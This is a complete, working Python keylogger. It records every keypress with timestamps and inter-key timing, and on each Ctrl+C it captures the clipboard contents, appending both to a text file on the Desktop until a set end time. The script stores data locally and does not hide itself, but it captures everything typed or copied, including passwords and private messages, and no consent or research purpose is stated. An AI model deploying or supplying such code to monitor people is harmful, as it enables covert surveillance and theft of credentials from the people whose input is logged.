import keyboard
import time
from datetime import datetime
import os
import pyperclip

# Get the desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
log_file = os.path.join(desktop_path, "keylog_with_end_time.txt")

# Variable to store the time of the previous keystroke
previous_time = time.time()

# Define the target end time (e.g., "12:58" or "00:04:25")
end_time_str = "23:58"  # Format: HH:MM
end_time = datetime.strptime(end_time_str, "%H:%M").time()

# Function to log data to the file
def log_data(data):
    with open(log_file, "a") as f:
        f.write(data)

# Map for numpad keys (scan codes to numbers)
numpad_map = {
    'num 0': '0',
    'num 1': '1',
    'num 2': '2',
    'num 3': '3',
    'num 4': '4',
    'num 5': '5',
    'num 6': '6',
    'num 7': '7',
    'num 8': '8',
    'num 9': '9',
}

def log_key(event):
    global previous_time
    current_time = datetime.now()

    # Stop logging if the current time reaches the end time
    if current_time.time() >= end_time:
        print("End time reached. Stopping keylogger.")
        return False

    try:
        # Record time differences and timestamps
        key_time = time.time()
        time_difference = round((key_time - previous_time) * 1000, 2)  # in milliseconds
        previous_time = key_time

        timestamp = current_time.strftime("%Y-%m-%d %H:%M:%S")

        # Get the name of the key pressed
        key_name = event.name

        # Handle numpad keys
        if key_name in numpad_map:
            log_data(f"{timestamp} | {time_difference} ms | {numpad_map[key_name]}\n")
        elif len(key_name) == 1:
            # Log alphanumeric keys directly
            log_data(f"{timestamp} | {time_difference} ms | {key_name}\n")
        else:
            # Log special keys (e.g., space, backspace, etc.)
            log_data(f"{timestamp} | {time_difference} ms | [{key_name}]\n")
    except Exception as e:
        # Log any unexpected errors
        log_data(f"{timestamp} | Error: {e}\n")

# Clipboard logging function
def log_clipboard():
    try:
        clipboard_content = pyperclip.paste()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_data(f"{timestamp} | Clipboard: {clipboard_content}\n")
    except Exception as e:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_data(f"{timestamp} | Clipboard Error: {e}\n")

# Start listening for keyboard events
keyboard.on_press(log_key)

# Log clipboard content when Ctrl+C is pressed
keyboard.add_hotkey('ctrl+c', log_clipboard)

# Run until the end time is reached, handling KeyboardInterrupt gracefully
exit_program = False

try:
    while not exit_program:
        current_time = datetime.now()
        if current_time.time() >= end_time:
            print("End time reached. Exiting.")
            exit_program = True  # Set the flag to exit the loop
        time.sleep(1)
except KeyboardInterrupt:
    # Ignore the interruption and continue running
    pass
finally:
    print("Keylogger has finished logging.")

